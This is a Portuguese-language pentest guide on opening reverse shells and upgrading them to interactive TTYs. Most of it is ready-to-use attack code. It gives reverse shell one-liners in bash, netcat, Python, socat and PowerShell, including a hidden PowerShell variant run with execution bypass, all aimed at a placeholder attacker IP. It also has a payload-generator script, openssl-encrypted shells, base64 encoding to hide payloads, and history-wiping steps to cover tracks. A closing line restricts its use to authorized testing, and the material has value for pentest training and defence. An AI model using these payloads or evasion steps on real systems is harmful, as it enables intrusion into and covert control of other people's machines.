<!-- ===================================== -->
<!--  Reverse Shell Stabilization Guide     -->
<!-- ===================================== -->

<p align="center">
  <img src="https://img.shields.io/badge/Status-Developed-success?style=for-the-badge">
  <img src="https://img.shields.io/badge/Topic-Reverse%20Shell-critical?style=for-the-badge">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Post--Exploitation-Offensive-red?style=flat-square">
  <img src="https://img.shields.io/badge/Linux-Terminal-black?style=flat-square&logo=linux&logoColor=white">
  <img src="https://img.shields.io/badge/Networking-TCP/IP-blue?style=flat-square">
  <img src="https://img.shields.io/badge/Hardening-Defensive-informational?style=flat-square">
</p>

---

# 🔁 Reverse Shell — Estabilização e Upgrade de TTY

> Guia técnico completo sobre **reverse shells**, abordando desde o estabelecimento inicial da conexão até a **estabilização total do terminal (TTY interativo)**, incluindo técnicas usadas em **pós-exploração, pentest e laboratórios controlados**.

---

### 📌 Metadados

- **Data:** 2026-01-11  
- **Status:** `#developed`  
- **Categoria:** Post-Exploitation · Reverse Shell  
- **Ambiente:** Linux · Unix-like  

---

### 🏷️ Tags

`#ReverseShell` `#PostExploitation` `#Pentest` `#CyberSecurity`  
`#TTY` `#ShellUpgrade` `#LinuxSecurity`  
`#RedTeam` `#BlueTeam` `#Networking`

----
## O que é um Reverse Shell?

Um **reverse shell** é uma sessão de shell remota onde a conexão é iniciada pela máquina comprometida (cliente) para o atacante (servidor). Isso é usado para contornar firewalls e NAT que bloqueiam conexões diretas.

---
## Por que estabilizar um Reverse Shell?

### Problemas de um Shell Básico:

- **Sem tratamento de sinais** (Ctrl+C, Ctrl+Z mata a sessão)
- **Sem autocompletar** (tab)
- **Sem manipulação de terminal** (setas não funcionam)
- **Sem modo RAW** (não pode usar editores como vim/nano)
- **Output truncado** para comandos longos
- **Sem variáveis de ambiente** ($TERM, $SHELL)

---
## Processo Completo de Estabilização

### Fase 1: Estabelecimento Inicial

#### 1.1 No atacante:

```bash
# Método 1: Netcat tradicional
nc -lvnp 443

# Métedo 2: Netcat com keep-alive
nc -lvnp 443 -k

# Método 3: Socat (mais robusto)
socat file:`tty`,raw,echo=0 TCP-L:443
```

**Explicação dos parâmetros:**

- `-l`: modo listen (escuta)
- `-v`: verbose (mostra conexões)
- `-n`: não resolve DNS (mais rápido)
- `-p`: porta
- `-k`: aceita múltiplas conexões

#### 1.2 Na vítima (payloads comuns)

```bash
# Bash
bash -i >& /dev/tcp/SEU_IP/443 0>&1

# Netcat tradicional
nc SEU_IP 443 -e /bin/bash

# Netcat sem -e (alternativa)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc SEU_IP 443 > /tmp/f

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("SEU_IP",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

>[!note] Nota:
>É possível também usar o site [Reverse Shell Generator](https://www.revshells.com/) para gerar comandos para reverse shell de maneira mais eficiente.

### Fase 2: Upgrade para TTY Interativo

#### 2.1 Método Python (recomendado)

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

**Explicação:**

- `pty`: módulo Python para manipulação de pseudo-terminais
- `pty.spawn()`: cria um novo processo com terminal pseudo-TTY
- `/bin/bash`: shell a ser executado no novo TTY

#### 2.2 Alternativas sem Python

Usando script:

```bash
# Método 1: Usando script
script /dev/null -c bash

# Método 2: Usando expect
/usr/bin/expect -c 'spawn bash; interact'

# Método 3: Usando Perl
perl -e 'exec "/bin/sh";'

# Método 4: Usando Ruby
ruby -e 'exec "/bin/sh"'

# Método 5: Usando socat (se instalado na vítima)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:SEU_IP:4444
```

Método com apenas shell (se `/proc` disponível):

```bash
# Verificar se /proc está disponível
ls -la /proc/$$/fd/

# Se disponível, usar:
exec sh -i < /dev/tcp/SEU_IP/443 1>&0 2>&0
```

### Fase 3: Configuração do Terminal

#### 3.1 Background do shell atual

```bash
# Pressionar Ctrl+Z para suspender o processo
# Isso retorna ao terminal do atacante
```

#### 3.2 Configurar terminal local

```bash
stty raw -echo; fg
```

**Explicação:**

- `stty`: comando para configurar parâmetros do terminal
- `raw`: modo raw - desabilita processamento especial de caracteres
- `-echo`: desabilita eco local (não mostra o que você digita duas vezes)
- `fg`: Traz o shell para foreground

#### 3.3 Configurar variáveis do ambiente

```bash
# Na vítima (depois do fg):
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows 50 columns 132  # Ajustar ao seu terminal
```

Para ajustar automaticamente:

```bash
# Pegar tamanho do terminal atual do atacante
rows=$(stty size | cut -d' ' -f1)
cols=$(stty size | cut -d' ' -f2)

# Na vítima:
stty rows $rows cols $cols
```

### Fase 4: Shell totalmente funcional

#### 4.1 Restar terminal

```bash
reset
```

#### 4.2 Configurar histórico e aliases

```bash
# Habilitar histórico
history -c  # Limpar histórico atual
export HISTFILE=/dev/null  # Não salvar histórico
# ou export HISTFILE=~/.bash_history

# Configurar prompt
export PS1="\[\e]0;\u@\h: \w\a\]${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ "
```

---
## Métodos Avançados

### 1. Socat

No atacante:

```bash
# Servidor
socat file:`tty`,raw,echo=0 tcp-l:443

# Se quiser SSL:
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
cat shell.key shell.crt > shell.pem
socat openssl-listen:443,cert=shell.pem,verify=0 file:`tty`,raw,echo=0
```

Na vítima:

```bash
# Cliente
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:SEU_IP:443

# Com SSL:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane openssl:SEU_IP:443,verify=0
```

### 2. Método com `/dev/tcp` (bash nativo)

```bash
# Na vítima, se bash estiver disponível:
exec 5<>/dev/tcp/SEU_IP/443
cat <&5 | while read line; do $line 2>&5 >&5; done
```

### 3. Método PowerShell (Windows/Linux com PS)

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('SEU_IP',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---
## Troubleshooting e Problemas Comuns

### 1. Se Ctrl+Z não funcionar

```bash
# Alternativa: usar outro terminal
# Em outra aba do atacante:
stty raw -echo; (stty size; cat) | nc -lvnp 4444

# Na vítima, redirecionar shell:
bash -i >& /dev/tcp/SEU_IP/4444 0>&1
```

### 2. Se `stty` falhar

```bash
# Usar Python para configurar:
python3 -c "import sys, termios, tty; tty.setraw(sys.stdin.fileno());"
```

### 3. Para limpar terminal bagunçado

```bash
# Pressionar Ctrl+J para novo prompt
# Digitar:
reset
# ou
echo -e "\033c"
```

### Shell muito limitado

```bash
# Se estiver em shell restrito (rbash), tentar:
BASH_CMDS[a]=/bin/sh;a
# ou
/bin/sh -i
```

---
## Script de Automação

### 1. Script do atacante

```bash
#!/bin/bash
# stabilize.sh

if [ -z "$1" ]; then
    echo "Uso: $0 <porta>"
    exit 1
fi

echo "[*] Aguardando conexão na porta $1..."
nc -lvnp $1 &
sleep 2

echo "[*] Quando conectar, use Ctrl+Z"
echo "[*] Depois execute: stty raw -echo; fg"
echo "[*] Na vítima, configure: export TERM=xterm; stty rows $(stty size | cut -d' ' -f1) cols $(stty size | cut -d' ' -f2)"
```

### 2. Payload gerador

```python
#!/usr/bin/env python3
# gen_payload.py

import sys

ip = sys.argv[1] if len(sys.argv) > 1 else "SEU_IP"
port = sys.argv[2] if len(sys.argv) > 2 else "443"

payloads = {
    "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    "python": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
    "nc_traditional": f"nc {ip} {port} -e /bin/bash",
    "nc_no_e": f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {ip} {port} > /tmp/f"
}

for name, payload in payloads.items():
    print(f"\n[{name.upper()}]")
    print(payload)
```

---
## Considerações de Segurança

### 1. Criptografia

```bash
# Usar openssl para criptografar tráfego
# Atacante:
openssl s_server -quiet -key key.pem -cert cert.pem -port 443

# Vítima:
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect SEU_IP:443 > /tmp/s; rm /tmp/s
```

### 2. Ocultação

```bash
# Usar portas comuns (443, 53, 80)
# Encodar payload em base64
echo "bash -i >& /dev/tcp/IP/PORTA 0>&1" | base64
# Executar:
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC9JUC9QT1JUQSAwPiYx" | base64 -d | bash
```

---
## Fluxo Resumido

1. **Estabelecer conexão** com netcat básico
2. **Upgrade para TTY** com Python/alternativas
3. **Ctrl+Z** para suspender
4. **`stty raw -echo`** no terminal do atacante
5. **`fg`** para retornar ao shell
6. **Configurar variáveis** (TERM, SHELL, stty rows/cols)
7. **Resetar** se necessário

---
## Conclusão

A estabilização de reverse shell transforma uma conexão rudimentar em um terminal totalmente funcional, permitindo:

- Uso de editores (vim, nano)
- Autocompletar com TAB
- Histórico de comandos
- Setas para navegação
- Execução de programas interativos
- Manipulação adequada de sinais

**Importante**: Este conhecimento deve ser usado apenas para testes de penetração autorizados, hardening de sistemas ou fins educacionais em ambientes controlados.
